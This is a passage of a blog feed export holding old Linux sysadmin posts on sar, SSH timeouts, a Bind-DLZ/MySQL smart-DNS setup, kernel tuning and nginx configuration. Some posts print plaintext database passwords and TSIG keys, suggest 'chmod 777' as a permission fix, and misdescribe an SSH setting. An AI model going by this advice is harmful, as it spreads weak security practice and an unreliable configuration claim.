id="LANG-C-usr-bin-sar-A-f-tmp-jaylin-sa-gt-tmp-jaylin-sar"><a href="#LANG-C-usr-bin-sar-A-f-tmp-jaylin-sa-gt-tmp-jaylin-sar" class="headerlink" title="LANG=C /usr/bin/sar -A -f /tmp/jaylin_sa&gt; /tmp/jaylin_sar"></a>LANG=C /usr/bin/sar -A -f /tmp/jaylin_sa&gt; /tmp/jaylin_sar</h1><p>不加LANG=C，sar文件显示的时间为12小时制；加LANG=C之后，sar文件显示的时间为24小时制。Ksar工具只能识别24小时制的sar文件，所以切记执行转储时要加此环境变量。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux ssh通话时间保持</title>
      <link href="/2010/11/04/linux-ssh-call-time-maintained/"/>
      <url>/2010/11/04/linux-ssh-call-time-maintained/</url>
      <content type="html"><![CDATA[<p>打开 /etc/ssh/sshd_config 文件，找到一个参数为 ClientAliveCountMax，它是设定用户端的 SSH 连线闲置多长时间后自动终止连线的数值，单位为分钟。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>智能DNS(Bind DLZ MYSQL )实际部署案例</title>
      <link href="/2010/11/02/the-actual-deployment-case-of-the-smart-dns-bind-dlz-mysql/"/>
      <url>/2010/11/02/the-actual-deployment-case-of-the-smart-dns-bind-dlz-mysql/</url>
      <content type="html"><![CDATA[<p>XX网NS服务器为FreeBSD下的Bind master/slave ,起初因为访问量不太大，这个架构完全可以胜任，但是随着域名的增加，维护zone文件变得越来越复杂，一旦书写有误，会造成Bind无法解析域名。所以，特此部署了Bind DLZ Mysql，经过一个月的上线测试，发现其负载很小，每秒5qps。不存在mysql time out问题，因为mysql每时每刻都在查询.在这里感谢老曹的鼎力相助！  </p><p>目录</p><p>一、相关术语简介</p><p>二、智能DNS系统服务规划</p><p>三、MYSQLReplication及添加GoogleTCMALLOC库降低系统负载</p><p>四、安装配置Bind-DLZ 及相关脚本</p><p>五、测试Bind-DLZ相关总结</p><p>一相关术语简介：<br>1、智能DNS（Bind-view）：<br>智能DNS的原理很简单：在用户解析一个域名的时候，判断一下用户的IP，然后跟DNS服务器内部的IP表匹配一下，看看用户是电信还是网通用户，然后给用户返回对应的IP地址。目前的域名服务运营商不提供智能DNS服务，所以必须自行架设DNS服务或者使用网上免费的智能DNS服务，如DNSPOD.<br>2．Bind-DLZ<br>Bind-DLZ主页：<a href="http://bind-dlz.sourceforge.net/" target="_blank" rel="noopener">http://bind-dlz.sourceforge.net/</a><br>DLZ(Dynamically Loadable Zones)与传统的BIND9不同，BIND的不足之处：<br>* BIND从文本文件中获取数据，这样容易因为编辑错误出现问题。<br>* BIND需要将数据加载到内存中，如果域或者记录较多，会消耗大量的内存。<br>* BIND启动时解析Zone文件，对于一个记录较多的DNS来说，会耽误更多的时间。<br>* 如果近修改一条记录，那么要重新加载或者重启BIND才能生效，那么需要时间，可能会影响客户端查询。<br>而Bind-dlz 即将帮你解决这些问题, 对Zone文件操作也更方便了，直接对数据库操作,可以很方<br>便扩充及开发管理程序。  </p><p>二、智能DNS系统服务规划</p><p>1、NameServer服务器注册(到新网或者万网后台添加)<br>ns1.soshandong.com  192.19.13.15<br>ns2.soshandong.com  192.19.11.3  </p><p>NS1是master ，NS2是slave。两者数据通过mysql来同步。  </p><p>2、测试NS记录是否生效</p><p>#digns <a href="http://www.soshandong.com/" target="_blank" rel="noopener">www.soshandong.com</a></p><p>#dig<a href="http://www.soshandong.com/" target="_blank" rel="noopener">www.soshandong.com</a>+trace</p><p>3、Bind-View规划<br><a href="http://www.soshandong.com" target="_blank" rel="noopener">www.soshandong.com</a> 网通 (CNC)  124.133.11.78<br><a href="http://www.soshandong.com/" target="_blank" rel="noopener">www.soshandong.com</a> 电信(TELECOM) 58.56.11.153<br><a href="http://www.soshandong.com" target="_blank" rel="noopener">www.soshandong.com</a> 移动(ANY) 120.192.11.13  </p><p>三、MYSQLReplication在Ubuntu上的安装</p><p>Ubuntu上安装Mysql 5.1.51</p><p>因新安装的Ubuntu没有zlib-dev库和ncurses，需要执行apt-get 来安装他们  </p><p>#apt-get install zlib1g-dev ncurses</p><p>首先下载mysql-5.1.51.tar.gz，并解压.</p><p>#cd mysql-*</p><p>#sh mysql.sh</p><p>脚本执行完毕后，将my.cnf放到/etc下  </p><p># mv my.cnf /etc/</p><p>默认脚本会启动mysql，如果报错，会在数据库目录里有错误日志。</p><p>Mysql replication配置</p><p>1、Mysql安全设置  </p><ul><li>用mysqladmin命令来改root用户口令＃ mysqladmin -uroot password linuxtone.org//设置MySQL管理操作用户root的密码为52netseek  </li><li>用setpassword修改口令：<br>mysql&gt; set password for root@localhost=password(‘linuxtone.org);  </li><li>直接修改user表的root用户口令<br>mysql&gt; use mysql;<br>mysql&gt; update user set password=password(‘linuxtone.org’) where user=’root’;<br>mysql&gt; flush privileges;<br>2.删除默认的数据库和用户我们的数据库是在本地，并且也只需要本地的php脚本对mysql进行读取，所以很多用户不需要。m<br>ysql初始化后会自动生成空用户和test库，这会对数据库构成威胁，我们全部删除。我们使用mysql客户端程序连接到本地的mysql服务器后出现如下提示：<br>mysql&gt; drop database test;<br>mysql&gt; use mysql;<br>mysql&gt; delete from db;<br>mysql&gt; delete from user where not(host=”localhost” anduser=”root”);<br>mysql&gt; flush privileges;<br>Mysql replication设置<br>3、Master 机器设置权限，赋予Slave机器FILE及Replication Slave权利，并打包要同步的数据库结构。<br>Master#./mysql –u root –plinuxtone.org<br>Enter password:<br>Welcome to the MySQL monitor. Commands end with ; or \g.<br>Your MySQL connection id is 2 to server version: 5.1.51<br>Type ‘help;’or ‘\h’ for help. Type ‘\c’ to clear the buffer.<br>mysql&gt; GRANTFILE ON<em>.</em> TO <a href="mailto:slaverep@172.19.1.3" target="_blank" rel="noopener">slaverep@172.19.1.3</a> IDENTIFIEDBY ‘slaverep’;<br>mysql&gt;GRANT REPLICATION SLAVE ON <em>.</em> TO <a href="mailto:slaverep@172.19.1.3%20IDENTIFIED" target="_blank" rel="noopener">slaverep@172.19.1.3 IDENTIFIED</a>BY ‘linuxtone.org’;<br>mysql&gt;Flushprivilege;<br>赋予192.19.11.3也就是Slave 机器有File权限, 这个5.1.51版对replication的权限好像做了调整，只赋予Slave机器有File权限还不行，还要给它REPLICATION SLAVE的权限才可以。<br>Master 导入CDN。Sql文件建立CDN数据结构<br>#mysql–uroot –plinuxtone.org<br>Mysql&gt;create database cdn;<br>Mysql&gt;\q<br>#mysql<br>cdn –uroot –plinuxtone.org &lt;cdn.sql #cdn.sql位置<br>这样master 就有了CDN库的数据结构。<br>Slave一样。这样不再重复<br>2设置主服务器Master的my.cnf，启动Mysql服务<br>Master# vi/etc/my.cnf<br>在[mysqld]添加或修改以下的<br>[mysqld]<br>log-bin = /home/data/mysql/data/binlog/binlog#打开logbin选项以能写到slave的 I/O线程;<br>server-id=1 #表示是本机的序号为1,一般来讲就是master的意思.<br>binlog-do-db= cdn #表示同步cdn数据库;<br>PS:提供的My。Cnf 比较详细。<br>然后把Master主服务器的Mysql重启。<br>Master# servicemysqld restart  </li></ul><p>4、修改Slave服务器的my.cnf</p><p>Slave# vi/etc/my.cnf<br>在[mysqld]添加或修改以下的<br>master-host=192.19.13.15<br>master-user=slaverep<br>master-password=linuxtone.org<br>master-port=3306<br>server-id=10<br>master-connect-retry=60<br>replicate-do-db=cdn [要更新的数据库]<br>log-slave-updates<br>5、删除Slave端数据库目录中的master.info<br>Slave# rm -fmaster.info<br>6、重启动Slave的slave start。<br>Slave#servicemysqld restart<br>7、测试先检测两个Mysql数据库中的cdn是否正常。正常情况应该是Master和Slave 中的Mysql 都有相同的cdn 数据库，并且里面的数据都一样。然后测试replication 功能是否起用。在Master中的reptest数据库添加一笔数据：<br>Master#mysql –u root -p<br>Enter password:<br>Welcome to the MySQL monitor. Commands end with ; or \g.<br>Your MySQL connection id is 12 to server version: 5.1.51<br>Type ‘help;’or ‘\h’ for help. Type ‘\c’ to clear the buffer.<br>mysql&gt;use cdn;<br>Database changed<br>mysql&gt; INSERT INTO rep_table VALUES (‘test1’, ‘4321’, ‘T’,24);<br>Query OK, 1 row affect ed (0.00 sec)<br>mysql&gt;<br>然后查看Slave机器的reptest数据库：<br>Slave#mysql–u root –p<br>Enterpassword:<br>Welcome to the MySQL monitor. Commands end with ; or \g.<br>Your MySQL connection id is 12 to server version: 5.1.49<br>Type ‘help;’or ‘\h’ for help. Type ‘\c’ to clear the buffer.<br>mysql&gt;use cdn;<br>Database changed<br>mysql&gt;select * from reptable;;<br>+——+——+——+——+<br>| id | name| sex | age |<br>+——+——+——+——+<br>| test1|4321 | T | 24 |<br>+——+——+——+——+<br>1 row in set(0.00 sec)  </p><p>为mysql 添加TCMalloc库降低系统负载</p><p>TCMalloc（Thread-CachingMalloc）是google开发的开源工具──“<a href="http://code.google.com/p/google-perftools/" target="_blank" rel="noopener">google-perftools</a>”中的成员。与标准的glibc库的malloc相比，TCMalloc在内存的分配上效率和速度要高得多，可以在很大程度上提高MySQL服务器在高并发情况下的性能，降低系统负载。<br>1、64位操作系统请先安装libunwind库，32位操作系统不要安装。libunwind库为基于64位CPU和操作系统的程序提供了基本的堆栈辗转开解功能，其中包括用于输出堆栈跟踪的API、用于以编程方式辗转开解堆栈的API以及支持C++异常处理机制的API。  </p><p>wget <a href="http://download.savannah.gnu.org/releases/libunwind/libunwind-0.99.tar.gz" target="_blank" rel="noopener">http://download.savannah.gnu.org/releases/libunwind/libunwind-0.99.tar.gz</a><br>tar zxvf libunwind-0.99.tar.gz<br>cd libunwind-0.99/<br>CFLAGS=-fPIC ./configure<br>make CFLAGS=-fPIC<br>make CFLAGS=-fPIC install</p><p>2、安装google-perftools：  </p><p>wget <a href="http://google-perftools.googlecode.com/files/google-perftools-1.6.tar.gz" target="_blank" rel="noopener">http://google-perftools.googlecode.com/files/google-perftools-1.6.tar.gz</a><br>tar zxvf google-perftools-1.6.tar.gz<br>cd google-perftools-1.6/<br>./configure<br>make &amp;&amp; make install<br>echo “/usr/local/lib” &gt;/etc/ld.so.conf.d/usr_local_lib.conf<br>/sbin/ldconfig</p><p>3、修改MySQL启动脚本（根据你的MySQL安装位置而定）：  </p><p>vi /usr/local/mysql/bin/mysqld_safe</p><p>　　在# executingmysqld_safe的下一行，加上：  </p><p>export LD_PRELOAD=/usr/local/lib/libtcmalloc.so</p><p>保存后退出，然后重启MySQL服务器。  </p><p>4、使用lsof命令查看tcmalloc是否起效： lsof -n | grep tcmalloc</p><p>如果发现以下信息，说明tcmalloc已经起效：  </p><p>mysqld 10847 mysql mem REG 8,5 1203756 20484960/usr/local/lib/libtcmalloc.so.0.0.0</p><p>四.安装配置Bind-DLZ 及相关脚本  </p><p>1．安装bind</p><p>#mkdir /usr/local/src/bind-dlz  </p><p>#cd /usr/local/src/bind-dlz  </p><p>#wget <a href="http://ftp.isc.org/isc/bind9/9.6.0-P1/bind-9.6.0-P1.tar.gz" target="_blank" rel="noopener">http://ftp.isc.org/isc/bind9/9.6.0-P1/bind-9.6.0-P1.tar.gz</a>  </p><p>#tar zxvf bind-9.6.0-P1.tar.gz</p><p>#cd bind-9.6.0-P1  </p><p>#./configure –with-dlz-mysql –enable-largefile –enable-threads=no–prefix=/usr/local/bind</p><p>#make –j4 &amp;&amp; make install</p><p>2.创建相关配置文件  </p><p>cd /usr/local/bind/etc<br>../sbin/rndc-confgen &gt;rndc.conf<br>tail -n10 rndc.conf | head -n9 | sed -e s/#\//g &gt;named.conf</p><p># vilocalhost.zone</p><p>ttl 86400<br>@ IN SOA localhost. root.localhost. (<br>1997022700 ; Serial<br>28800 ; Refresh<br>14400 ; Retry<br>3600000 ; Expire<br>86400 ) ; Minimum<br>IN NS localhost.<br>1 IN PTR localhost.</p><p># dig &gt;named.root  </p><p>#vi named.conf 在后面加入如下：  </p><p>include”/usr/local/bind/etc/cnc_acl.conf”; //网通ACL<br>include “/usr/local/bind/etc/telecom_acl.conf”; //电信ACL<br>include “/usr/local/bind/etc/edu_acl.conf”; //教育网ACL<br>include “/usr/local/bind/etc/view.conf”; //DLZ相关的配</p><p>3、配置DNSTSIG</p><p>1、使用dnssec-keygenfunction 产生加密密钥，一个为public key,另一  </p><p>个为private key,本文假设应用服务器存在CNC,TELECOM,EDU,ANY</p><p>(1)产生加密金钥  </p><p>#cd /usr/local/bind/sbin</p><p>#./dnssec-keygen -a hmac-md5 -b 128 -n HOSTcnc</p><p>#./dnssec-keygen -a hmac-md5 -b 128 -n HOSTtelecom</p><p>#./dnssec-keygen -ahmac-md5 -b 128 -n HOST edu  </p><p>#./dnssec-keygen -a hmac-md5 -b 128 -n HOST any<br>(2)查看生成的密钥文件  </p><p># cat Kcnc.+157+24406.private //以网通为例.</p><p>Private-key-format: v1.2</p><p>Algorithm: 157 (HMAC_MD5)</p><p>Key: YTjTOw00PzeEaasA16/Rvw==</p><p>Bits: AAA=</p><p>将:YTjTOw00PzeEaasA16/Rvw== 加入到named.conf，其它同例。  </p><p>详细请参照named.conf配置文件  </p><p>2、配置named.conf  </p><p>#vi /usr/local/bind/etc/named.conf  </p><p>key “rndc-key” {</p><p>algorithm hmac-md5;</p><p>secret “5PubnjGuAWeH9F2dIUYd6g==”;</p><p>};</p><p>controls {</p><p>inet 127.0.0.1 port 953</p><p>allow { 127.0.0.1; } keys {“rndc-key”; };</p><p>};</p><p>#</p><p>options {</p><p>directory “/usr/local/bind/etc”;</p><p>pid-file “named.pid”;</p><p>};</p><p>#TSIG-key</p><p>key “cnc” {</p><p>algorithm hmac-md5;</p><p>secret “YTjTOw00PzeEaasA16/Rvw==”;</p><p>};</p><p>key “telecom” {</p><p>algorithm hmac-md5;</p><p>secret”pUcQGLpSH2tQgVZ9ZHU6Yg==”;</p><p>};</p><p>key “edu”{</p><p>algorithm hmac-md5;</p><p>secret”Bzo6MTzrzbRFQbONYTS1Cw==”;</p><p>};</p><p>key “any”{</p><p>algorithm hmac-md5;</p><p>secret”DHpPfGJdMLv91OygBf9H6w==”;</p><p>};</p><p>#acl</p><p>acl”dns-ip-list”{</p><p>172.19.3.15; #masterDNS IP</p><p>172.19.1.3; #slaveDNS IP</p><p>};</p><p>#acl include</p><p>include”/usr/local/bind/etc/cnc_acl.conf”; //网通ACL</p><p>include”/usr/local/bind/etc/telecom_acl.conf”; //电信 ACL</p><p>include”/usr/local/bind/etc/edu_acl.conf”; //教育网ACL</p><p>incl ude”/usr/local/bind/etc/view.conf”; //bind-view部分  </p><p>3．Bind 启动脚本</p><p>#!/bin/sh</p><p># powered bydz<a href="http://www.com" target="_blank" rel="noopener">www.com</a></p><p>case”$1” in</p><p>start)</p><p>if [ -x/usr/local/bind/sbin/named ]; then</p><p>/usr/local/bind/sbin/named-c /usr/local/bind/etc/named.conf -u bind</p><p>echo”BIND9-named server started”</p><p>fi</p><p>;;</p><p>stop)</p><p>kill `cat/usr/local/bind/etc/named.pid` &amp;&amp; echo . &amp;&amp; echo ‘BIND9 serverstopped’</p><p>;;</p><p>restart)</p><p>echo .</p><p>echo”Restart BIND9 server”</p><p>$0 stop</p><p>sleep 10</p><p>$0 start</p><p>;;</p><p>reload)</p><p>/usr/local/bind/sbin/rndcreload</p><p>;;</p><p>status)</p><p>/usr/local/bind/sbin/rndcstatus</p><p>;;</p><p>*)</p><p>echo”$0 start | stop | restart |reload |status”</p><p>;;</p><p>esac</p><p>./bind9 start 启动bind；./bind9 stop停止bind;<br>./bind9 reload #重载配置文件  </p><p>剩余文档见打包的bind-dlz.tar.gz。里面很详细。部署的master时候用tar zvxf bind-dlz-tar.gz –C /usr/local/bind/etc覆盖即可，剩下的slave在部署bind还是将配置文件解压到/usr/local/bind/etc/即可，将rndc-key 和dnssec重新配置一遍就可以用了！</p><p>部署DNS，防火墙和路由器要设置清楚，我部署的时候就是因为黑洞防火墙没有对master和slave服务器开放tcp和udp53端口，造成不能解析域名。需要大家切记！<br>MYSQL Master info  </p><p><img src="http://bbs.linuxtone.org/data/attachment/forum/201010/27/004210fdskdppmrcpwk4r4.jpg" alt="1.jpg" title="1.jpg"></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>netfile表满了，连接异常，和本地端口满了，</title>
      <link href="/2010/11/01/the-netfile-table-is-full-the-connection-exception-and-the-local-port-is-full/"/>
      <url>/2010/11/01/the-netfile-table-is-full-the-connection-exception-and-the-local-port-is-full/</url>
      <content type="html"><![CDATA[<p>net.ipv4.ip_conntrack_max = 65536</p><p>iptables的连接跟踪池满了</p><p>net.ipv4.ip_conntrack_max = 65536，这个满了</p><p>满了以后iptables就开始丢包了</p><p>sysctl -w net.ipv4.ip_conntrack_max=1048576</p><p>本地端口满了</p><p>net.ipv4.ip_local_port_range = 32768    61000</p><p>修改可以端口</p><p> sysctl -w net.ipv4.ip_local_port_range=”1025 65534”</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>在Linux上安装ImageMagick和JMagick</title>
      <link href="/2010/11/01/install-imagemagick-and-jmagick-on-linux/"/>
      <url>/2010/11/01/install-imagemagick-and-jmagick-on-linux/</url>
      <content type="html"><![CDATA[<p>下载ImageMagick-6.2.6-8.tar.gz,JMagick-6.2.6-0.tar.gz另外我下载了jpegsrc.v6b.tar.gz, libpng-1.2.10.tar.bz2和tiff-3.8.2.tar.gz,用户支持jpg,png和tiff格式的文件,真不知道老外是如何想的,图像处理不支持jpg和png的应用应该不多吧,为什么不放在一起,还有另外安装.</p><p>   编译并安装Jpg格式支持文件,</p><p>   tar zvxf jpegsrc.v6b.tar.gz</p><p>   ./configure –enable-shared –enable-static </p><pre><code>makesumake install</code></pre><p>   安装png支持文件</p><p>   bunzip2 libpng-1.2.10.tar.bz2</p><p>   tar xvf libpng-1.2.10.tar</p><pre><code>./configure   makesumake install</code></pre><p>   编译安装tiff支持文件</p><p>   编译并安装Jpg格式支持文件,</p><p>   tar zvxf tiff-3.8.2.tar.gz</p><p>   ./configure   </p><pre><code>makesumake install</code></pre><p>   修改ImageMagick的配置文件 configure</p><p>   –without-jpeg=false    disable JPEG support</p><p>   –without-png=false     disable PNG support</p><p>   –without-tiff=false    disable TIFF support</p><p>   编译并且安装  ImageMagick</p><pre><code>tar zvxf ImageMagick-6.2.6-8.tar.gz</code></pre><p>   ./configure   </p><pre><code>make allsumake install使用convert 看看是否可以转换文件编译并且安装JMagicktar zvxf JMagick-6.2.6-0.tar.gz</code></pre><p>   ./configure   </p><pre><code>makesumake install配置当前用户的配置文件.bash_profile增加 LD\_LIBRARY\_PATH=/usr/local/lib:../../lib:export LD\_LIBRARY\_PATH并且配置classpath 目录 安装完成</code></pre>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx – failed (13: Permission denied) while reading upstream</title>
      <link href="/2010/10/26/nginx-failed-13-permission-denied-while-reading-upstream/"/>
      <url>/2010/10/26/nginx-failed-13-permission-denied-while-reading-upstream/</url>
      <content type="html"><![CDATA[<p>At my job we are moving to Nginx for the load balancing of our sites. Nginx is a very powerful load balancing/proxy server tool. It allows weighting, ssl acceleration, among other functionality while remaining light weight and easy to configure.</p><p>In preperation for a large web services launch, I began to analyze some logs and keep an eye on the system. I noticed one of the sites that we’ve already deployed was hammering our error messages in /var/log/nginx/error.log reading:</p><blockquote><p>2009/06/23 12:38:22 [crit] 808#0: *724154 open() “/var/nginx/tmp/proxy_temp/4/83/0000002834″ failed (13: Permission denied) while reading upstream, client: XXX.XXX.XXX.XXX, server: xxx.host.com, request: “GET /dir/page.php”, upstream: “<a href="http://backendserverip/dir/page.php”" target="_blank" rel="noopener">http://backendserverip/dir/page.php”</a>, host: “host.com”, referrer: “<a href="http://referrer.com/apage.php”" target="_blank" rel="noopener">http://referrer.com/apage.php”</a></p></blockquote><p>Upon reviewing the site I noticed some (not all) of the pages were only partially loading. The issue is exactly what the log says. Permission denied = Permission issue.</p><p>Check your /etc/nginx/nginx.conf (OpenBSD) file for the user nginx processes will run as:</p><blockquote><p>user  nobody;</p></blockquote><p>Or, do:</p><blockquote><p># ps aux | grep “nginx: worker process” | awk ‘{print $1}’<br>nobody</p></blockquote><p>In both cases you see that I’m running the nginx worker process as user nobody. Now we need to check our permissions on: /var/nginx/tmp/proxy_temp</p><blockquote><p># ls -l /var/nginx/tmp/ | grep proxy_temp<br>drwxrwx—  12 nobody  _nginx  512 Jun 23 13:10 proxy_temp</p></blockquote><p>Looks good. The directory is owned by nobody and is writeable by both nobody and the group _nginx. What could the issue be? Lets move up a level and check the permissions.</p><blockquote><p># ls -l /var/nginx | grep tmp<br>drwx——  5 _nginx  _nginx  512 May  7 11:54 tmp</p></blockquote><p>Ah ha! The parent directory is owned my _nginx:_nginx and is only writeable for that user. Our user ‘nobody’ therefore does not have the permissions to write in here. So, we can do a few things. Either make the entire directory writeable by everyone or change the ownership.</p><blockquote><p># chmod 777 /var/nginx/tmp</p><p>or</p><p># chown nobody:_nginx /var/nginx/tmp</p></blockquote><p>This should cure your permissions issues and all pages should load completely (at least mine do!)</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>将nginx配置成url_hash转发方式</title>
      <link href="/2010/10/25/configure-nginx-to-be-the-url-hash-forwarding-method-2/"/>
      <url>/2010/10/25/configure-nginx-to-be-the-url-hash-forwarding-method-2/</url>
      <content type="html"><![CDATA[<p>所需软件名称及版本：<br>pcre-8.02.tar.gz<br>nginx-0.7.58.tar.gz<br>Nginx_upstream_hash-0.3.1.tar.gz</p><p>1、安装pcre<br>tar -zxvf pcre-8.02.tar.gz<br>cd pcre-8.02/<br>./configure<br>make &amp;&amp; make install    </p><p>2、给nginx安装url_hash补丁<br>tar -zxvf nginx-0.7.58.tar.gz<br>tar -zxvf Nginx_upstream_hash-0.3.1.tar.gz<br>cd nginx-0.7.58/<br>patch -p0 &lt; /var/tmp/loojoy/nginx_upstream_hash-0.3.1/nginx.patch   </p><p>3、安装nginx<br>groupadd www<br>useradd www -g www<br>./configure –prefix=/usr/local/webserver/nginx \<br>–user=www \<br>–group=www \<br>–add-module=/var/tmp/loojoy/nginx_upstream_hash-0.3.1 \<br>–with-http_ssl_module \<br>–with-http_stub_status_module    </p><p>4、检查nginx生成的配置文件是否正确<br>/usr/local/webserver/nginx/sbin/nginx -t  </p><p> 5、启动nginx<br>若nginx.conf检查通过，则启动nginx。<br>/usr/local/webserver/nginx/sbin/nginx<br>6、查看端口80<br>netstat -ant</p><p>7、通过浏览器访问：<br><a href="http://your_nginx_server_ip/" target="_blank" rel="noopener">http://your_nginx_server_ip/</a><br>若可以正常访问，则nginx安装成功。</p><p>8、修改nginx的配置文件如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">-------------------url_hash转发方式nginx.conf--------------------     </span><br><span class="line">user www www;     </span><br><span class="line">worker_processes 10;     </span><br><span class="line">error_log logs/error.log;     </span><br><span class="line">\#error_log logs/error.log notice;     </span><br><span class="line">\#error_log logs/error.log info;     </span><br><span class="line">\#pid        logs/nginx.pid;     </span><br><span class="line">worker\_rlimit\_nofile 51200;              </span><br><span class="line">events     </span><br><span class="line">&#123;     </span><br><span class="line">      use epoll;     </span><br><span class="line">      worker_connections 51200;     </span><br><span class="line">&#125;     </span><br><span class="line">    </span><br><span class="line">http     </span><br><span class="line">&#123;     </span><br><span class="line">      include       mime.types;     </span><br><span class="line">      default_type application/octet-stream;     </span><br><span class="line">      keepalive_timeout 120;     </span><br><span class="line">      tcp_nodelay on;     </span><br><span class="line">    </span><br><span class="line">      upstream your.website.name&#123;     </span><br><span class="line">              server   your.tomcat.server.ip1:8080 ;     </span><br><span class="line">              server   your.tomcat.server.ip1:8080 ;     </span><br><span class="line">    </span><br><span class="line">              hash $request_uri;                      </span><br><span class="line">      &#125;     </span><br><span class="line">    </span><br><span class="line">      server     </span><br><span class="line">      &#123;     </span><br><span class="line">              listen 80;     </span><br><span class="line">              server_name your.website.name;     </span><br><span class="line">    </span><br><span class="line">              location / &#123;     </span><br><span class="line">                       proxy_pass        http://your.website.name;     </span><br><span class="line">                       proxy\_set\_header   Host             $host;     </span><br><span class="line">                       proxy\_set\_header   X-Real-IP        $remote_addr;     </span><br><span class="line">                       proxy\_set\_header   X-Forwarded-For $proxy\_add\_x\_forwarded\_for;     </span><br><span class="line">              &#125;     </span><br><span class="line">    </span><br><span class="line">              log\_format www\_gjw\_com &apos;$remote\_addr - $remote\_user [$time\_local] $request &apos;    </span><br><span class="line">                                &apos;&quot;$status&quot; $body\_bytes\_sent &quot;$http_referer&quot; &apos;    </span><br><span class="line">                                &apos;&quot;$http\_user\_agent&quot; &quot;$http\_x\_forwarded_for&quot;&apos;;     </span><br><span class="line">              #access\_log /data1/logs/www.log www\_gjw_com;     </span><br><span class="line">    </span><br><span class="line">              location /nginx_status &#123;     </span><br><span class="line">                   stub_status on;                                     </span><br><span class="line">                   access_log   off;     </span><br><span class="line">              &#125;     </span><br><span class="line">   &#125;     </span><br><span class="line">&#125;           </span><br><span class="line">    </span><br><span class="line">-------------------url_hash转发方式nginx.conf--------------------</span><br></pre></td></tr></table></figure></p><p>9、添加nginx启动、关闭、重启脚本<br>——————-url_hash转发方式nginx启动、关闭脚本——————–     </p><p>#!/bin/sh     </p><p>CWD=`pwd`        </p><p>case \$1 in<br>        start)<br>                        /usr/local/webserver/nginx/sbin/nginx<br>   ;;<br>        stop)<br>                ki ll -2 `ps -ef|grep “/usr/local/webserver/nginx/sbin/nginx”|grep -v “grep”|awk ‘{print \$2}’ `<br>                        ;;<br>        restart)<br>                cd “\$CMD”<br>                \$0 stop<br>                \$0 start<br>        ;;<br>        *)<br>        echo $”Usage: \$0 {start|stop|restart}”<br>        exit 1<br>esac<br>exit 0      </p><p>——————-url_hash转发方式nginx启动、关闭脚本——————-<br>更改该文件权限<br>chmod u+x nginx.sh     </p><p>启动 nginx ./nginx.sh start<br>重启 nginx ./nginx.sh restart<br>关闭 nginx ./nginx.sh stop</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> upstream_hash </tag>
            
            <tag> url_hash </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>平滑升级 nginx</title>
      <link href="/2010/10/25/smooth-and-upgrade-nginx/"/>
      <url>/2010/10/25/smooth-and-upgrade-nginx/</url>
      <content type="html"><![CDATA[<p>当为在线服务的 nginx 升级或添加模块时，能否可以平滑升级呢。nginx 常更新，开发者应该早就注意到这问题。</p><p>查看其 wiki 可以做到。</p><p>有 nginx 的 kill 信号机制，关键信号：</p><p>USR2 平滑升级可执行程序。<br>WINCH 从容关闭工作进程<br>QUIT 从容关闭</p><p>1、先发送 USR2 信号，如：</p><p>kill -USR2 `cat logs/nginx.pid`    </p><p>kill -USR2 `cat logs/nginx.pid`</p><p>此时用 ps -ef | grep nginx 可以看到多了一倍的 nginx 的相关进程。同时 logs 目录下多了一个 nginx.pid.oldbin 文件，记录的是旧的 nginx 主进程的 pid。</p><p>2、用 WINCH 信号关闭旧的工作进程</p><p>kill -WINCH `cat logs/nginx.pid.oldbin`    </p><p>kill -WINCH `cat logs/nginx.pid.oldbin`</p><p>此时，旧的 nginx 主进程还没关闭的，只是旧的 nginx 工作进程关了。如果正常可以执行第3部</p><p>3、用 QUIT 信号关闭旧的 nginx 主进程</p><p>kill -QUIT `cat logs/nginx.pid.oldbin`    </p><p>kill -QUIT `cat logs/nginx.pid.oldbin`</p><p>这样算升级了,新的主进程退出后，旧的主进程会由移除 .oldbin 前缀，恢复为它的 .pid 文件，这样，一切就都恢复到升级之前了。</p><p>当然在第2部的时候可能发现不对，可以补救，你仍可以恢复旧的服务器：</p><p>发送 HUP 信号给旧的主进程 - 它将在不重载配置文件的情况下启动它的工作进程<br>发送 QUIT 信号给新的主进程，要求其从容关闭其工作进程<br>发送 TERM 信号给新的主进程，迫使其退出<br>如果因为某些原因新的工作进程不能退出，向其发送 KILL 信号</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 升级nginx </tag>
            
            <tag> 平滑 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安装setuptools</title>
      <link href="/2010/10/25/install-setuptools/"/>
      <url>/2010/10/25/install-setuptools/</url>
